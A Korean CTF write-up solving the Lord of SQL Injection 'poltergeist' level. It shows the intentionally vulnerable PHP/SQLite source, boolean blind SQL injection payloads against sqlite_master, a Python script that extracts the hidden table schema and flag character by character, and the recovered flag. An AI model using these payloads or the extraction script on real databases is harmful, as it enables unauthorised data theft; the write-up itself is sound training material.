---
title: "[Lord of SQL Injection] LoS - poltergeist 문제풀이"
date: 2019-07-04
draft: false
category: [wargame]
subcategories: [lord-of-sql-injection]
tags: [Write-up, Lord of SQL Injection]
---

다음 문제는 `poltergeist` 이다.
이번 문제는 소스 코드를 좀 많이 짜야했다.  

<!--more-->

코드는 다음과 같다.  

```php
-----------------------------------------------------------------
query : select id from member where id='admin' and pw=''
-----------------------------------------------------------------

<?php
  include "./config.php";
  login_chk();
  $db = sqlite_open("./db/poltergeist.db");
  $query = "select id from member where id='admin' and pw='{$_GET[pw]}'";
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  $result = sqlite_fetch_array(sqlite_query($db,$query));
  if($result['id']) echo "<h2>Hello {$result['id']}</h2>";

  if($poltergeistFlag === $_GET['pw']) solve("poltergeist");// Flag is in `flag_{$hash}` table, not in `member` table. Let's look over whole of the database.
  highlight_file(__FILE__);
?>
```

내가 입력 한 값은 `member`라는 테이블에서 값을 추출하는 쿼리에 들어가는데, 문제를 풀기 위해서는 `$poltergeistFlag`라는 변수의 값을 입력 해 주어야 한다.
또한 이 변수의 값은 이미 선언되어 있는 값이고, 주석에 해당 값은 `flag_{$hash}`라는 테이블에 들어 가 있다고 한다.
즉, 주석에 적혀있는데로 데이터베이스를 다 뒤져야 한다. ㅠㅠ

문제를 풀기 위해서는 먼저 테이블 명을 알고, 그 다음 컬럼 명 마지막으로 테이블명과 컬럼명을 바탕으로 데이터를 추출해야 한다.
`SQLite`는 데이터베이스의`schema`를 `sqlite_master`라는 테이블에 저장하고 있다.
따라서 테이블명과 컬럼명을 알기 위해서는 해당 테이블을 이용하면 된다.
테이블 명과 컬럼 명을 알 수 있는 쿼리문은 다음과 같다.  

```mysql
select sql from sqlite_master where tbl_name like 'flag_%';
```

해당 쿼리를 입력하면 `sqlite_master`이라는 테이블에서 `tbl_name` 즉, 테이블 명이 `flag_%`의 형태로 이루어진 행을 찾아 그 행의 `sql` 열의 값을 추출한다.
`%`는 와일드카드로, 모든 문자를 의미하며, `like` 사용 시 `%`를 사용할 수 있다.
따라서 `tbl_name like 'flag_%'` 구문은 `flag_a`, `flag_123`처럼 테이블 명에 `flag_`이 있고 해당 문자 뒤에 어떤 문자라도 들어있다면 대상에 속한다.
`sql`에는 해당 테이블을 생성하는 쿼리문이 저장되어 있다.
즉, `create` 문이 저장되어 있는 것이다.
이제 테이블 명과 컬럼명을 알아낼 수 있는 쿼리문을 찾았으니, 해당 쿼리문을 문제의 쿼리문에 더해서 하나의 쿼리문으로 만들어야 한다.
현재 문제에 있는 쿼리는 다음과 같다.  

```mysql
select id from member where id='admin' and pw='{$_GET[pw]}'
```

따라서 내가 입력 한 값은 `$_GET[pw]`에 입력되기 때문에 서브쿼리 형태로 넣어주어야 한다.
이를 위해 아래와 같이 쿼리를 구성했다.  

```mysql
# 길이 구하기
select id from member where id='admin' and pw='1' or id='admin' and length((select sql from sqlite_master where tbl_name like 'flag_%'))=1 -- '

# 내용 구하기
select id from member where id='admin' and pw='1' or id='admin' and substr((select sql from sqlite_master where tbl_name like 'flag_%'), 1, 1)='a
```

또한 위의 방법으로 찾은 테이블 명과 컬럼 명을 가지고 플래그를 찾기 위해서는 아래의 쿼리를 사용했다.  

```mysql
select COLUMN_NAME from TABLE_NAME
```

이를 코드로 구현하면 다음과 같다.  

```python
import requests

table = ""
column = ""
flag = ""
sql = ""
length = 0

url = "https://los.rubiya.kr/chall/poltergeist_a62c7abc7e6ce0080dbf0e14a07d1f1d.php?pw="
session = dict(PHPSESSID = "YOUR SESSION ID")

print "[+] Start"

print "[+] Find length of the SQL"

for i in range(0, 100):
        try:
                query = url + "1' or id='admin' and length((select sql from sqlite_master where tbl_name like 'flag_%'))=" + str(i) + " -- "
                r = requests.post(query, cookies=session)
        except:
                print "[-] Error occur"
                continue

        if 'Hello admin' in r.text:
                length = i
                break

print "[+] Found length : ", length

print "[+] Find SQL"

for j in range(1, length + 1):
        for i in range(32, 128):
                try:
                        query = url + "1' or id='admin' and substr((select sql from sqlite_master where tbl_name like 'flag_%'), " + str(j) + ", 1)='" + chr(i)
                        r = requests.post(query, cookies=session)
                except:
                        print "[-] Error occur"
                        continue

                if 'Hello admin' in r.text:
                        sql += chr(i)
                        print "[+] Found " + str(j), ":", sql
                        break

print "[+] Found SQL : ", sql

table = sql.split("`")[1]
column = sql.split("`")[3]

print "[+] Find length of the flag"

for i in range(0, 100):
        try:
                query = url + "1' or id='admin' and length((select " + column + " from " + table + "))=" + str(i) + " -- "
                r = requests.post(query, cookies=session)
        except:
                print "[-] Error occur"
                continue

        if 'Hello admin' in r.text:
                length = i
                break

print "[+] Found length : ", length

print "[+] Find flag"

for j in range(1, length + 1):
        for i in range(32, 128):
                try:
                        query = url + "1' or id='admin' and substr((select " + column + " from " + table + "), " + str(j) + ", 1)='" + chr(i)
                        r = requests.post(query, cookies=session)
                except:
                        print "[-] Error occur"
                        continue

                if 'Hello admin' in r.text:
                        flag += chr(i)
                        print "[+] Found " + str(j), ":", flag
                        break

print "[+] Found flag : ", flag
print "[+] End"
```

해당 코드를 실행하면 결과는 다음과 같다.  

```bash
$ python test.py 
[+] Start
[+] Find length of the SQL
[+] Found length :  54
[+] Find SQL
[+] Found 1 : C
[+] Found 2 : CR
[+] Found 3 : CRE
[+] Found 4 : CREA
[+] Found 5 : CREAT
[+] Found 6 : CREATE
[+] Found 7 : CREATE 
[+] Found 8 : CREATE T
[+] Found 9 : CREATE TA
[+] Found 10 : CREATE TAB
[+] Found 11 : CREATE TABL
[+] Found 12 : CREATE TABLE
[+] Found 13 : CREATE TABLE 
[+] Found 14 : CREATE TABLE `
[+] Found 15 : CREATE TABLE `f
[+] Found 16 : CREATE TABLE `fl
[+] Found 17 : CREATE TABLE `fla
[+] Found 18 : CREATE TABLE `flag
[+] Found 19 : CREATE TABLE `flag_
[+] Found 20 : CREATE TABLE `flag_7
[+] Found 21 : CREATE TABLE `flag_70
[+] Found 22 : CREATE TABLE `flag_70c
[+] Found 23 : CREATE TABLE `flag_70c8
[+] Found 24 : CREATE TABLE `flag_70c81
[+] Found 25 : CREATE TABLE `flag_70c81d
[+] Found 26 : CREATE TABLE `flag_70c81d9
[+] Found 27 : CREATE TABLE `flag_70c81d99
[+] Found 28 : CREATE TABLE `flag_70c81d99`
[+] Found 29 : CREATE TABLE `flag_70c81d99` 
[+] Found 30 : CREATE TABLE `flag_70c81d99` (
[+] Found 33 : CREATE TABLE `flag_70c81d99` (`
[+] Found 34 : CREATE TABLE `flag_70c81d99` (`f
[+] Found 35 : CREATE TABLE `flag_70c81d99` (`fl
[+] Found 36 : CREATE TABLE `flag_70c81d99` (`fla
[+] Found 37 : CREATE TABLE `flag_70c81d99` (`flag
[+] Found 38 : CREATE TABLE `flag_70c81d99` (`flag_
[+] Found 39 : CREATE TABLE `flag_70c81d99` (`flag_0
[+] Found 40 : CREATE TABLE `flag_70c81d99` (`flag_08
[+] Found 41 : CREATE TABLE `flag_70c81d99` (`flag_087
[+] Found 42 : CREATE TABLE `flag_70c81d99` (`flag_0876
[+] Found 43 : CREATE TABLE `flag_70c81d99` (`flag_08762
[+] Found 44 : CREATE TABLE `flag_70c81d99` (`flag_087628
[+] Found 45 : CREATE TABLE `flag_70c81d99` (`flag_0876285
[+] Found 46 : CREATE TABLE `flag_70c81d99` (`flag_0876285c
[+] Found 47 : CREATE TABLE `flag_70c81d99` (`flag_0876285c`
[+] Found 49 : CREATE TABLE `flag_70c81d99` (`flag_0876285c`T
[+] Found 50 : CREATE TABLE `flag_70c81d99` (`flag_0876285c`TE
[+] Found 51 : CREATE TABLE `flag_70c81d99` (`flag_0876285c`TEX
[+] Found 52 : CREATE TABLE `flag_70c81d99` (`flag_0876285c`TEXT
[+] Found 54 : CREATE TABLE `flag_70c81d99` (`flag_0876285c`TEXT)
[+] Found SQL :  CREATE TABLE `flag_70c81d99` (`flag_0876285c`TEXT)
[+] Find length of the flag
[+] Found length :  38
[+] Find flag
[+] Found 1 : F
[+] Found 2 : FL
[+] Found 3 : FLA
[+] Found 4 : FLAG
[+] Found 5 : FLAG{
[+] Found 6 : FLAG{e
[+] Found 7 : FLAG{ea
[+] Found 8 : FLAG{ea5
[+] Found 9 : FLAG{ea5d
[+] Found 10 : FLAG{ea5d3
[+] Found 11 : FLAG{ea5d3b
[+] Found 12 : FLAG{ea5d3bb
[+] Found 13 : FLAG{ea5d3bbd
[+] Found 14 : FLAG{ea5d3bbdc
[+] Found 15 : FLAG{ea5d3bbdcc
[+] Found 16 : FLAG{ea5d3bbdcc4
[+] Found 17 : FLAG{ea5d3bbdcc4a
[+] Found 18 : FLAG{ea5d3bbdcc4ae
[+] Found 19 : FLAG{ea5d3bbdcc4aec
[+] Found 20 : FLAG{ea5d3bbdcc4aec9
[+] Found 21 : FLAG{ea5d3bbdcc4aec9a
[+] Found 22 : FLAG{ea5d3bbdcc4aec9ab
[+] Found 23 : FLAG{ea5d3bbdcc4aec9abe
[+] Found 24 : FLAG{ea5d3bbdcc4aec9abe4
[+] Found 25 : FLAG{ea5d3bbdcc4aec9abe4a
[+] Found 26 : FLAG{ea5d3bbdcc4aec9abe4a6
[+] Found 27 : FLAG{ea5d3bbdcc4aec9abe4a6a
[+] Found 28 : FLAG{ea5d3bbdcc4aec9abe4a6a9
[+] Found 29 : FLAG{ea5d3bbdcc4aec9abe4a6a9f
[+] Found 30 : FLAG{ea5d3bbdcc4aec9abe4a6a9f6
[+] Found 31 : FLAG{ea5d3bbdcc4aec9abe4a6a9f66
[+] Found 32 : FLAG{ea5d3bbdcc4aec9abe4a6a9f66e
[+] Found 33 : FLAG{ea5d3bbdcc4aec9abe4a6a9f66ea
[+] Found 34 : FLAG{ea5d3bbdcc4aec9abe4a6a9f66eaa
[+] Found 35 : FLAG{ea5d3bbdcc4aec9abe4a6a9f66eaaa
[+] Found 36 : FLAG{ea5d3bbdcc4aec9abe4a6a9f66eaaa1
[+] Found 37 : FLAG{ea5d3bbdcc4aec9abe4a6a9f66eaaa13
[+] Found 38 : FLAG{ea5d3bbdcc4aec9abe4a6a9f66eaaa13}
[+] Found flag :  FLAG{ea5d3bbdcc4aec9abe4a6a9f66eaaa13}
[+] End
```

모든 데이터베이스를 뒤진 후에 플래그를 찾을 수 있었다.
따라서 아래의 값을 입력하면 문제를 풀 수 있다.  

```plain
?pw=FLAG{ea5d3bbdcc4aec9abe4a6a9f66eaaa13}
```

---

```php
--------------------------------------------------------------------------------------------------------------------
query : select id from member where id='admin' and pw='FLAG{ea5d3bbdcc4aec9abe4a6a9f66eaaa13}'
--------------------------------------------------------------------------------------------------------------------

POLTERGEIST Clear!

<?php
  include "./config.php";
  login_chk();
  $db = sqlite_open("./db/poltergeist.db");
  $query = "select id from member where id='admin' and pw='{$_GET[pw]}'";
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  $result = sqlite_fetch_array(sqlite_query($db,$query));
  if($result['id']) echo "<h2>Hello {$result['id']}</h2>";

  if($poltergeistFlag === $_GET['pw']) solve("poltergeist");// Flag is in `flag_{$hash}` table, not in `member` table. Let's look over whole of the database.
  highlight_file(__FILE__);
?>
```

---

```plain
POLTERGEIST Clear!!
```